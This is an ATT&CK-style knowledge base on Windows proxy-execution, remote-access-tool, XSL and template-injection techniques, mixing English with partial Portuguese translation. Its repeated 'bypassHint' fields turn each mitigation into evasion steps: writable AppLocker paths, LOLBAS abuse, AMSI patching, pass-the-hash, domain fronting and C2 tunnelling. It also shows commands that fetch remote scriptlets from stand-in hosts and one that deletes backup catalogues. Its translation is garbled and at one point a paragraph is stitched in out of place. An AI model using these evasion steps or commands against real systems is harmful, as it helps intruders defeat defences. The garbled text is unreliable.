Os adversários podem abusar de rundll32.exe to proxy execution of código malicioso. Using rundll32.exe, vice executing directly (i.e. **Shared Modules** (`T1129`)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: `rundll32.exe {DLLname, DLLfunction}`).

Rundll32.exe pode também ser utilizado para execute **Control Panel** (`T1218.002`) Item files (.cpl) through the undocumented shell32.dll functions `Control_RunDLL` and `Control_RunDLLAsUser`. Double-clicking a .cpl file also causes rundll32.exe to execute. `[Ref: Trend Micro CPL]` Por exemplo, **ClickOnce** (`T1127.002`) can be proxied through Rundll32.exe.

Rundll32 pode também ser utilizado para execute scripts such as JavaScript. This can be done using a syntax similar to this: `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"`  This behavior has been seen used by malware such as Poweliks. `[Ref: This is Security Command Line Confusion]`

Threat actors may also abuse legitimate, signed system DLLs (e.g., `zipfldr.dll, ieframe.dll`) with `rundll32.exe` para executar código ou artefactos maliciosos programs or scripts indirectly, making their activity appear more legitimate and evading detection. `[Ref: lolbas project Zipfldr.dll]` `[Ref: lolbas project Ieframe.dll]`

Os adversários podem também attempt to obscure código malicioso from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command `rundll32.exe ExampleDLL.dll, ExampleFunction`, rundll32.exe would first attempt to execute `ExampleFunctionW`, or failing that `ExampleFunctionA`, before loading `ExampleFunction`). Os adversários podem therefore obscure código malicioso by creating multiple identical exported function names and appending `W` and/or `A` to harmless ones. `[Ref: Attackify Rundll32.exe Obscurity]` `[Ref: Github NoRunDll]` DLL functions can also be exported and executed by an ordinal number (ex: `rundll32.exe file.dll,#1`).

Additionally, adversaries may use **Masquerading** (`T1036`) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload. `[Ref: rundll32.exe defense evasion]`

techniques.fullNamePt: System Binary Encaminhamento via Proxy / Redirector Execution: Verclsid
techniques.descriptionPt:
Os adversários podem abusar de verclsid.exe to proxy execution of código malicioso. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell. `[Ref: WinOSBite verclsid.exe]`

Os adversários podem abusar de verclsid.exe para executar código ou artefactos maliciosos payloads. This may be achieved by running `verclsid.exe /S /C {CLSID}`, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to **Regsvr32** (`T1218.010`)). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse. `[Ref: LOLBAS Verclsid]` `[Ref: Red Canary Verclsid.exe]` `[Ref: BOHOPS Abusing the COM Registry]` `[Ref: Nick Tyrer GitHub]`

mitigations.name: Execution Prevention
mitigations.descriptionPt: Utilizar Application Control (ex: AppLocker / WDAC) configured to block execution of verclsid.exe if it is not required for a given system or network to prevent potential misuse by adversaries.
mitigations.bypassHint: Enumerar regras de AppLocker em `HKLM\Software\Policies\Microsoft\Windows\SrpV2` e localizar diretórios graváveis dentro de `C:\Windows\` (ex: `C:\Windows\Tasks`, `C:\Windows\Temp`, `C:\Windows\tracing`, `C:\Windows\System32\spool\drivers\color`). Caso haja validação de assinatura/hash (WDAC), utilizar Living-off-the-Land Binaries (LOLBAS) assinados pela Microsoft como `MSBuild.exe` (T1127.001), `InstallUtil.exe` (T1218.004), `Regsvr32.exe` (T1218.010) ou `Certutil.exe`.

mitigations.name: Filter Network Traffic
mitigations.descriptionPt: Consider modifying host firewall rules to prevent egress traffic from verclsid.exe.
mitigations.bypassHint: Procurar protocolos alternativos abertos no host de destino: (1) Se RPC/DCOM alternativo ou portas altas estiverem acessíveis, usar DCOM (`MMC20.Application`, `ShellWindows` - `T1021.003`); (2) Se MSSQL (1433) estiver acessível, usar `xp_cmdshell` ou CLR Assemblies; (3) Se SSH (22) ou RDP (3389) estiverem abertos, usar RestrictedAdmin Mode (`sekurlsa::pth` + `mstsc /restrictedadmin` - `T1021.001`); (4) Abusar de partilhas de ficheiros ou GPOs / SCCM para implantação indireta (`T1072`).

mitigations.name: Disable or Remove Feature or Program
mitigations.descriptionPt: Consider removing verclsid.exe if it is not necessary within a given environment.
mitigations.bypassHint: Para PowerShell bloqueado: o motor do PowerShell reside em `System.Management.Automation.dll`, não no executável `powershell.exe`. Carregar a DLL diretamente dentro de um binário C# compilado ou via `MSBuild.exe` / `InstallUtil.exe` (Unmanaged PowerShell - `T1059.001` + `T1127.001`). Para bloqueio de Macros Office (MotW): usar contentores `.ISO`/`.VHDX` ou ficheiros `.LNK` / `.WSF` / ClickOnce (`T1553.005`, `T1204.002`).

techniques.fullNamePt: System Binary Encaminhamento via Proxy / Redirector Execution: Mavinject
techniques.descriptionPt:
Os adversários podem abusar de mavinject.exe to proxy execution of código malicioso. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V). `[Ref: LOLBAS Mavinject]`

Os adversários podem abusar de mavinject.exe to inject malicious DLLs into running processes (i.e. **Dynamic-link Library Injection** (`T1055.001`)), allowing for código arbitrário execution (ex. `C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL`). `[Ref: ATT Lazarus TTP Evolution]` `[Ref: Reaqta Mavinject]` Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. 

Adicionalmente a **Dynamic-link Library Injection** (`T1055.001`), Mavinject.exe can also be abused to perform import descriptor injection via its  `/HMODULE` command-line parameter (ex. `mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER`). This command would inject an import table entry consisting of the specified DLL into the module at the given base address. `[Ref: Mavinject Functionality Deconstructed]`

Carregar a DLL diretamente dentro de um binário C# compilado ou via `MSBuild.exe` / `InstallUtil.exe` (Unmanaged PowerShell - `T1059.001` + `T1127.001`). Para bloqueio de Macros Office (MotW): usar contentores `.ISO`/`.VHDX` ou ficheiros `.LNK` / `.WSF` / ClickOnce (`T1553.005`, `T1204.002`).

analytics.name: Analytic 1207
analytics.descriptionPt: Abuse of mavinject.exe to inject DLLs or import descriptors into another running process. Chain: (1) mavinject.exe starts with /INJECTRUNNING or /HMODULE → (2) mavinject obtains high-access handles to a target process (VM_WRITE/CREATE_THREAD) → (3) target process loads attacker DLL (module load) → (4) optional follow-on child activity or network egress from the target process.

mutableElements.description: Correlation interval (e.g., 5–10 minutes) linking mavinject start → ProcessAccess → module load/network from the target process.
Patterns for suspicious DLL locations (e.g., %TEMP%, Downloads, UNC shares) to reduce noise from legitimate injections.
Common legitimate targets for App-V (if used) to suppress; flag unusual targets like browsers, LSASS, Winlogon, EDR processes.
Set of access rights that imply injection (VM_WRITE, VM_OPERATION, CREATE_THREAD). Tune for your EDR/sysmon formatting.
Legitimate parents starting mavinject (e.g., App-V services) vs. suspicious parents (Office, script hosts, browsers).
Known enterprise update/CDN ranges to exclude when correlating post-injection network activity.
Alerting when Microsoft-signed mavinject leads to loading unsigned DLLs in a target process.

**MinGrantedAccessSet**: Set of access rights that imply injection (VM_WRITE, VM_OPERATION, CREATE_THREAD). Tune for your EDR/sysmon formatting.
**ParentProcessFilter**: Legitimate parents starting mavinject (e.g., App-V services) vs. suspicious parents (Office, script hosts, browsers).

techniques.fullNamePt: System Binary Encaminhamento via Proxy / Redirector Execution: MMC
techniques.descriptionPt:
Os adversários podem abusar de mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt. `[Ref: win_mmc]` `[Ref: what_is_mmc]` MMC pode ser utilizado para create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins pode ser empregue para manage Windows systems locally or remotely. MMC pode também ser utilizado para open Microsoft created .msc files to manage system configuration. `[Ref: win_msc_files_overview]`

Por exemplo, `mmc C:\Users\foo\admintools.msc /a` will open a custom, saved console msc file in author mode. `[Ref: win_mmc]` Another common example is `mmc gpedit.msc`, which will open the Group Policy Editor application window. 

Os adversários podem utilizar MMC commands to perform malicious tasks. Por exemplo, `mmc wbadmin.msc delete catalog -quiet` deletes the backup catalog on the system (i.e. **Inhibit System Recovery** (`T1490`)) without prompts to the user (Note: `wbadmin.msc` may only be present by default on Windows Server sistema operativos). `[Ref: win_wbadmin_delete_catalog]` `[Ref: phobos_virustotal]`

Os adversários podem também abuse MMC para executar código ou artefactos maliciosos .msc files. Por exemplo, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a **Component Object Model** (`T1559.001`) class object. `[Ref: win_clsid_key]` Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey. `[Ref: mmc_vulns]` Uma vez que the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: `mmc.exe -Embedding C:\path\to\test.msc`. `[Ref: abusing_com_reg]`

mitigations.name: Disable or Remove Feature or Program
mitigations.descriptionPt: MMC may not be necessary within a given environment since it is primarily used by system administrators, not regular users or clients.
mitigations.bypassHint: Para PowerShell bloqueado: o motor do PowerShell reside em `System.Management.Automation.dll`, não no executável `powershell.exe`. Carregar a DLL diretamente dentro de um binário C# compilado ou via `MSBuild.exe` / `InstallUtil.exe` (Unmanaged PowerShell - `T1059.001` + `T1127.001`). Para bloqueio de Macros Office (MotW): usar contentores `.ISO`/`.VHDX` ou ficheiros `.LNK` / `.WSF` / ClickOnce (`T1553.005`, `T1204.002`).

mitigations.name: Execution Prevention
mitigations.descriptionPt: Utilizar Application Control (ex: AppLocker / WDAC) configured to block execution of MMC if it is not required for a given system or network to prevent potential misuse by adversaries.
mitigations.bypassHint: Enumerar regras de AppLocker em `HKLM\Software\Policies\Microsoft\Windows\SrpV2` e localizar diretórios graváveis dentro de `C:\Windows\` (ex: `C:\Windows\Tasks`, `C:\Windows\Temp`, `C:\Windows\tracing`, `C:\Windows\System32\spool\drivers\color`). Caso haja validação de assinatura/hash (WDAC), utilizar Living-off-the-Land Binaries (LOLBAS) assinados pela Microsoft como `MSBuild.exe` (T1127.001), `InstallUtil.exe` (T1218.004), `Regsvr32.exe` (T1218.010) ou `Certutil.exe`.

techniques.fullNameEn: System Binary Proxy Execution: Electron Applications
techniques.fullNamePt: System Binary Encaminhamento via Proxy / Redirector Execution: Electron Applications
techniques.descriptionPt:
Os adversários podem abusar de components of the Electron framework para executar código ou artefactos maliciosos code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams. `[Ref: Electron 2]` Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS. `[Ref: Electron 3]` The Chromium engine é utilizado para display web content and Node.js runs the backend code. `[Ref: Electron 1]`

Due to the functional mechanics of Electron (such as allowing apps to run comandos arbitrários), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework. `[Ref: Electron 1]` Por exemplo, the abuse of `teams.exe` and `chrome.exe` may allow adversaries para executar código ou artefactos maliciosos commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher="C:\Windows\system32\cmd.exe /c calc.exe`). `[Ref: Electron 6-8]`

Os adversários podem também execute malicious content by planting malicious **JavaScript** (`T1059.007`) within Electron applications. `[Ref: Electron Security]`

mitigations.name: Exploit Protection
mitigations.descriptionPt:
Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature pode ser utilizado para block methods of using trusted binaries para contornar (bypass) application control. 
Garantir que Electron is updated to the latest version and critical vulnerabilities (such as nodeIntegration bypasses) are patched and cannot be exploited.

mitigations.name: Disable or Remove Feature or Program
mitigations.descriptionPt: Remove or deny access to unnecessary and potentially vulnerable software and features to prevent abuse by adversaries. Many native binaries may not be necessary within a given environment: for example, consider disabling the Node.js integration in all renderers that display remote content to protect users by limiting adversaries’ power to plant malicious JavaScript within Electron applications. `[Ref: Electron Security 2]`
mitigations.bypassHint: Para PowerShell bloqueado: o motor do PowerShell reside em `System.Management.Automation.dll`, não no executável `powershell.exe`. Carregar a DLL diretamente dentro de um binário C# compilado ou via `MSBuild.exe` / `InstallUtil.exe` (Unmanaged PowerShell - `T1059.001` + `T1127.001`). Para bloqueio de Macros Office (MotW): usar contentores `.ISO`/`.VHDX` ou ficheiros `.LNK` / `.WSF` / ClickOnce (`T1553.005`, `T1204.002`).

mitigations.name: Execution Prevention
mitigations.descriptionPt:
Where possible, enforce binary and application integrity with digital signature verification to prevent untrusted code from executing. Por exemplo, do not use `shell.openExternal` with untrusted content.

Where possible, set `nodeIntegration` to false, which disables access to the Node.js function. `[Ref: Electron Security 3]` By disabling access to the Node.js function, this may limit the ability para executar código ou artefactos maliciosos commands by injecting JavaScript code.

Do not disable `webSecurity`, which may allow for users of the application to invoke malicious content from online sources.

Caso haja validação de assinatura/hash (WDAC), utilizar Living-off-the-Land Binaries (LOLBAS) assinados pela Microsoft como `MSBuild.exe` (T1127.001), `InstallUtil.exe` (T1218.004), `Regsvr32.exe` (T1218.010) ou `Certutil.exe`.

techniques.fullNamePt: Remote Access Tools
techniques.descriptionPt:
Um adversário pode use legitimate remote access tools to establish an interactive Command and Control (C2) channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management. `[Ref: Symantec Living off the Land]` `[Ref: CrowdStrike 2015 Global Threat Report]` `[Ref: CrySyS Blog TeamSpy]` Os adversários podem similarly abuse response features included in EDR and other defensive tools that enable remote access.

Remote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.

Installation of many remote access tools may also include persistence (e.g., the software's installation routine creates a **Windows Service** (`T1543.003`)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop). `[Ref: Google Chrome Remote Desktop]` `[Ref: Chrome Remote Desktop]`

mitigations.name: Execution Prevention
mitigations.descriptionPt: Utilizar Application Control (ex: AppLocker / WDAC) to mitigate installation and use of unapproved software that can be used for remote access.
mitigations.bypassHint: Enumerar regras de AppLocker em `HKLM\Software\Policies\Microsoft\Windows\SrpV2` e localizar diretórios graváveis dentro de `C:\Windows\` (ex: `C:\Windows\Tasks`, `C:\Windows\Temp`, `C:\Windows\tracing`, `C:\Windows\System32\spool\drivers\color`). Caso haja validação de assinatura/hash (WDAC), utilizar Living-off-the-Land Binaries (LOLBAS) assinados pela Microsoft como `MSBuild.exe` (T1127.001), `InstallUtil.exe` (T1218.004), `Regsvr32.exe` (T1218.010) ou `Certutil.exe`.

mitigations.name: Filter Network Traffic
mitigations.descriptionPt: Properly configure firewalls, application firewalls, and proxies to limit outgoing traffic to sites and services used by remote access software.
mitigations.bypassHint: Procurar protocolos alternativos abertos no host de destino: (1) Se RPC/DCOM alternativo ou portas altas estiverem acessíveis, usar DCOM (`MMC20.Application`, `ShellWindows` - `T1021.003`); (2) Se MSSQL (1433) estiver acessível, usar `xp_cmdshell` ou CLR Assemblies; (3) Se SSH (22) ou RDP (3389) estiverem abertos, usar RestrictedAdmin Mode (`sekurlsa::pth` + `mstsc /restrictedadmin` - `T1021.001`); (4) Abusar de partilhas de ficheiros ou GPOs / SCCM para implantação indireta (`T1072`).

mitigations.name: Limit Hardware Installation
mitigations.descriptionPt: Block the use of IP-based KVM devices within the network if they are not required.

mitigations.name: Network Intrusion Prevention
mitigations.descriptionPt: Network intrusion detection and prevention systems that use network signatures may be able to prevent traffic to remote access services.
mitigations.bypassHint: Adaptar o transporte de C2 ao tráfego permitido no ambiente: (1) Respeitar o Proxy Corporativo (WPAD / variáveis de ambiente / WinINet API que usa automaticamente credenciais NTLM/Kerberos do utilizador atual); (2) Usar Domain Fronting ou Web Services legítimos permitidos pela whitelist (GitHub, Microsoft Graph, OneDrive, Slack API - `T1102`); (3) Configurar Malleable C2 Profiles para imitar tráfego HTTPS legítimo e usar certificados TLS válidos com idade/reputação (`T1588.004`); (4) Caso HTTP/HTTPS esteja totalmente isolado, testar DNS Tunneling (`T1071.004`) ou pivotar via SMB Named Pipes (`T1090.001`) através de outro host com saída.

mitigations.name: Disable or Remove Feature or Program
mitigations.descriptionPt: Consider disabling unnecessary remote connection functionality, including both unapproved software installations and specific features built into supported applications.
mitigations.bypassHint: Para PowerShell bloqueado: o motor do PowerShell reside em `System.Management.Automation.dll`, não no executável `powershell.exe`. Carregar a DLL diretamente dentro de um binário C# compilado ou via `MSBuild.exe` / `InstallUtil.exe` (Unmanaged PowerShell - `T1059.001` + `T1127.001`). Para bloqueio de Macros Office (MotW): usar contentores `.ISO`/`.VHDX` ou ficheiros `.LNK` / `.WSF` / ClickOnce (`T1553.005`, `T1204.002`).

blockers: M1038 (Execution Prevention): Erro "This program is blocked by group policy" ao tentar executar binários em `C:\Users\*` ou `C:\Windows\Temp`.
M1037 (Filter Network Traffic): Movimentação lateral via `PsExec`, `evil-winrm` ou `wmiexec` falha por timeout de porta.
M1031 (Network Intrusion Prevention): Reverse shell ou beacon C2 não conecta para o exterior; conexões TCP diretas bloqueadas ou terminadas pelo Proxy/Firewall.
M1042 (Disable or Remove Feature or Program): `powershell.exe` bloqueado por GPO, ou Macros VBA desativadas por política de Mark-of-the-Web (MotW).
bypasses: Enumerar regras de AppLocker em `HKLM\Software\Policies\Microsoft\Windows\SrpV2` e localizar diretórios graváveis dentro de `C:\Windows\` (ex: `C:\Windows\Tasks`, `C:\Windows\Temp`, `C:\Windows\tracing`, `C:\Windows\System32\spool\drivers\color`). Caso haja validação de assinatura/hash (WDAC), utilizar Living-off-the-Land Binaries (LOLBAS) assinados pela Microsoft como `MSBuild.exe` (T1127.001), `InstallUtil.exe` (T1218.004), `Regsvr32.exe` (T1218.010) ou `Certutil.exe`.

Procurar protocolos alternativos abertos no host de destino: (1) Se RPC/DCOM alternativo ou portas altas estiverem acessíveis, usar DCOM (`MMC20.Application`, `ShellWindows` - `T1021.003`); (2) Se MSSQL (1433) estiver acessível, usar `xp_cmdshell` ou CLR Assemblies; (3) Se SSH (22) ou RDP (3389) estiverem abertos, usar RestrictedAdmin Mode (`sekurlsa::pth` + `mstsc /restrictedadmin` - `T1021.001`); (4) Abusar de partilhas de ficheiros ou GPOs / SCCM para implantação indireta (`T1072`).

Adaptar o transporte de C2 ao tráfego permitido no ambiente: (1) Respeitar o Proxy Corporativo (WPAD / variáveis de ambiente / WinINet API que usa automaticamente credenciais NTLM/Kerberos do utilizador atual); (2) Usar Domain Fronting ou Web Services legítimos permitidos pela whitelist (GitHub, Microsoft Graph, OneDrive, Slack API - `T1102`); (3) Configurar Malleable C2 Profiles para imitar tráfego HTTPS legítimo e usar certificados TLS válidos com idade/reputação (`T1588.004`); (4) Caso HTTP/HTTPS esteja totalmente isolado, testar DNS Tunneling (`T1071.004`) ou pivotar via SMB Named Pipes (`T1090.001`) através de outro host com saída.

Carregar a DLL diretamente dentro de um binário C# compilado ou via `MSBuild.exe` / `InstallUtil.exe` (Unmanaged PowerShell - `T1059.001` + `T1127.001`). Para bloqueio de Macros Office (MotW): usar contentores `.ISO`/`.VHDX` ou ficheiros `.LNK` / `.WSF` / ClickOnce (`T1553.005`, `T1204.002`).

techniques.fullNamePt: Remote Access Tools: IDE Tunneling
techniques.descriptionPt:
Os adversários podem abusar de Integrated Development Environment (IDE) software with remote development features to establish an interactive Command and Control (C2) channel on target systems within a network. IDE tunneling combines SSH, port forwarding, file sharing, and debugging into a single secure connection, letting developers work on sistemas remotos as if they were local. Unlike SSH and port forwarding, IDE tunneling encapsulates an entire session and may use proprietary tunneling protocols alongside SSH, allowing adversaries to blend in with legitimate development workflows. Some IDEs, like Visual Studio Code, also provide CLI tools (e.g., `code tunnel`) that adversaries may use to programmatically establish tunnels and generate web-accessible URLs for remote access. These tunnels can be authenticated through accounts such as GitHub, enabling the adversary to control the compromised system via a legitimate developer portal. `[Ref: sentinelone operationDigitalEye Dec 2024]` `[Ref: Unit42 Chinese VSCode 06 September 2024]` `[Ref: Thornton tutorial VSCode shell September 2023]`

Additionally, adversaries may use IDE tunneling for persistence. Some IDEs, such as Visual Studio Code and JetBrains, support automatic reconnection. Os adversários podem configure the IDE to auto-launch at startup, re-establishing the tunnel upon execution. Compromised developer machines may also be exploited as jump hosts to move further into the network.

IDE tunneling tools may be built-in or installed as **IDE Extensions** (`T1176.002`).

mitigations.name: Execution Prevention
mitigations.descriptionPt: Use Group Policies to require user authentication by disabling anonymous tunnel access, preventing any unauthenticated tunnel creation or usage. Disable the Visual Studio Dev Tunnels feature to block tunnel-related commands, allowing only minimal exceptions for utility functions (unset, echo, ping, and user). Restrict tunnel access to approved Microsoft Entra tenant IDs by specifying allowed tenants; all other users are denied access by default. `[Ref: Microsoft Dev Tunnels Group Policy Mitigation]` `[Ref: Microsoft Dev Tunnels Group Policies]`

techniques.fullNamePt: Remote Access Tools: Remote Desktop Software
techniques.descriptionPt:
Um adversário pode use legitimate desktop support software to establish an interactive Command and Control (C2) channel to target systems within networks. Desktop support software provides a graphical interface for remotely controlling another computer, transmitting the display output, keyboard input, and mouse control between devices using various protocols. Desktop support software, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment. `[Ref: Symantec Living off the Land]` `[Ref: CrowdStrike 2015 Global Threat Report]` `[Ref: CrySyS Blog TeamSpy]` 
 
Remote access modules/features may also exist as part of otherwise existing software such as Zoom or Google Chrome’s Remote Desktop. `[Ref: Google Chrome Remote Desktop]` `[Ref: Chrome Remote Desktop]`

techniques.fullNameEn: Remote Access Tools: Remote Access Hardware
techniques.fullNamePt: Remote Access Tools: Remote Access Hardware
techniques.descriptionPt:
Um adversário pode use legitimate remote access hardware to establish an interactive Command and Control (C2) channel to target systems within networks. These services, including IP-based keyboard, video, or mouse (KVM) devices such as TinyPilot and PiKVM, are commonly used as legitimate tools and may be allowed by peripheral device policies within a target environment.  

Remote access hardware may be physically installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote session with the target system. Using hardware-based remote access tools may allow threat actors para contornar (bypass) software security solutions and gain more control over the compromised device(s). `[Ref: Palo Alto Unit 42 North Korean IT Workers 2024]` `[Ref: Google Cloud Threat Intelligence DPRK IT Workers 2024]`

techniques.fullNamePt: XSL Script Processing
techniques.descriptionPt:
Os adversários podem contornar (bypass) application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.  `[Ref: Microsoft XSLT Script Mar 2017]`

Os adversários podem abusar de this functionality to execute arbitrary files while potentially bypassing application control. De forma semelhante a **Trusted Developer Utilities Proxy Execution** (`T1127`), the Microsoft common line transformation utility binary (msxsl.exe)  `[Ref: Microsoft msxsl.exe]` can be installed and used para executar código ou artefactos maliciosos JavaScript embedded within local or remote (URL referenced) XSL files.  `[Ref: Penetration Testing Lab MSXSL July 2017]` Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.  `[Ref: Reaqta MSXSL Spearphishing MAR 2018]` Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension. `[Ref: XSL Bypass Mar 2019]`

Command-line examples: `[Ref: Penetration Testing Lab MSXSL July 2017]` `[Ref: XSL Bypass Mar 2019]`

* `msxsl.exe customers[.]xml script[.]xsl`
* `msxsl.exe script[.]xsl script[.]xsl`
* `msxsl.exe script[.]jpeg script[.]jpeg`

Another variation of this technique, dubbed “Squiblytwo”, involves using **Windows Management Instrumentation** (`T1047`) to invoke JScript or VBScript within an XSL file. `[Ref: LOLBAS Wmic]` This technique can also execute local/remote scripts and, similar to its **Regsvr32** (`T1218.010`)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Command-line examples: `[Ref: XSL Bypass Mar 2019]` `[Ref: LOLBAS Wmic]`

* Local File: `wmic process list /FORMAT:evil[.]xsl`
* Remote File: `wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”`

techniques.fullNamePt: Template Injection
techniques.descriptionPt:
Os adversários podem criar or modify references in user document templates to conceal código malicioso or force authentication attempts. Por exemplo, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. `[Ref: Microsoft Open XML July 2017]`

Properties within parts may reference shared public resources accessed via online URLs. Por exemplo, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.

Os adversários podem abusar de these templates to initially conceal código malicioso to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. `[Ref: SANS Brian Wiltse Template Injection]` These documents can be delivered via other techniques such as **Phishing** (`T1566`) and/or **Taint Shared Content** (`T1080`) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. `[Ref: Redxorblue Remote Template Injection]` Examples have been seen in the wild where template injection was used to load código malicioso containing an exploit. `[Ref: MalwareBytes Template Injection OCT 2017]`

Os adversários podem também modify the `*\template` control word within an .rtf file to similarly conceal then download código malicioso. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. Contudo, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload. `[Ref: Proofpoint RTF Injection]` `[Ref: Ciberseguridad Decoding malicious RTF files]`

This technique may also enable **Forced Authentication** (`T1187`) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt. `[Ref: Anomali Template Injection MAR 2018]` `[Ref: Talos Template Injection July 2017]` `[Ref: ryhanson phishery SEPT 2016]`

mitigations.name: Antivirus/Antimalware
mitigations.descriptionPt: Network/Host intrusion prevention systems, antivírus (AV), and detonation chambers can be employed to prevent documents from fetching and/or executing malicious payloads. `[Ref: Anomali Template Injection MAR 2018]`
mitigations.bypassHint: Evitar escrita direta em disco (Fileless Execution / Reflective Loading). Em PowerShell/DotNet, aplicar AMSI Memory Patching em `amsi.dll` (`AmsiScanBuffer` ret patch) ou Hardware Breakpoints (VEH2) antes de carregar assemblies via `[System.Reflection.Assembly]::Load()`. Para binários nativos, aplicar cifragem de secções (AES/ChaCha20) com resolução dinâmica de APIs (API Hashing) e Direct/Indirect Syscalls.

mitigations.name: Network Intrusion Prevention
mitigations.descriptionPt: Network/Host intrusion prevention systems, antivírus (AV), and detonation chambers can be employed to prevent documents from fetching and/or executing malicious payloads. `[Ref: Anomali Template Injection MAR 2018]`
mitigations.bypassHint: Adaptar o transporte de C2 ao tráfego permitido no ambiente: (1) Respeitar o Proxy Corporativo (WPAD / variáveis de ambiente / WinINet API que usa automaticamente credenciais NTLM/Kerberos do utilizador atual); (2) Usar Domain Fronting ou Web Services legítimos permitidos pela whitelist (GitHub, Microsoft Graph, OneDrive, Slack API - `T1102`); (3) Configurar Malleable C2 Profiles para imitar tráfego HTTPS legítimo e usar certificados TLS válidos com idade/reputação (`T1588.004`); (4) Caso HTTP/HTTPS esteja totalmente isolado, testar DNS Tunneling (`T1071.004`) ou pivotar via SMB Named Pipes (`T1090.001`) através de outro host com saída.

mitigations.name: Disable or Remove Feature or Program
mitigations.descriptionPt: Consider disabling Microsoft Office macros/active content to prevent the execution of malicious payloads in documents  `[Ref: Microsoft Disable Macros]`, though this setting may not mitigate the **Forced Authentication** (`T1187`) use for this technique.
mitigations.bypassHint: Para PowerShell bloqueado: o motor do PowerShell reside em `System.Management.Automation.dll`, não no executável `powershell.exe`. Carregar a DLL diretamente dentro de um binário C# compilado ou via `MSBuild.exe` / `InstallUtil.exe` (Unmanaged PowerShell - `T1059.001` + `T1127.001`). Para bloqueio de Macros Office (MotW): usar contentores `.ISO`/`.VHDX` ou ficheiros `.LNK` / `.WSF` / ClickOnce (`T1553.005`, `T1204.002`).

techniques.namePt: Modificação de Permissões de Ficheiros e Diretórios
techniques.fullNamePt: Modificação de Permissões de Ficheiros e Diretórios
techniques.descriptionPt:
Os adversários podem modificar file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. `[Ref: Hybrid Analysis Icacls1 June 2018]` `[Ref: Hybrid Analysis Icacls2 May 2018]` File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via **Accessibility Features** (`T1546.008`), **Boot or Logon Initialization Scripts** (`T1037`), **Unix Shell Configuration Modification** (`T1546.004`), or tainting/hijacking other instrumental binary/configuration files via **Hijack Execution Flow** (`T1574`).

